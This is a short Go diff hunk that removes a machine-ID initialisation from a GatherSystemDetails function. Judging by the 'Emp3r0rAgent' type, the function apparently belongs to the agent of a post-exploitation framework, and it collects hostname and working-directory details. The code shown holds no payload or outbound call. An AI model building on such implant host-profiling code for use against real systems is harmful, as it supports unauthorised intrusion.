@@ -32,9 +32,6 @@ func GatherSystemDetails() *def.Emp3r0rAgent {
 		hostname = "no_name"
 	}
 
-	// Init machine ID for use in key gen and agent tag
-	common.RuntimeConfig.MachineID = util.GetMachineID()
-
 	info.CWD, err = os.Getwd()
 	if err != nil {
 		logging.Printf("Getwd: %v", err)
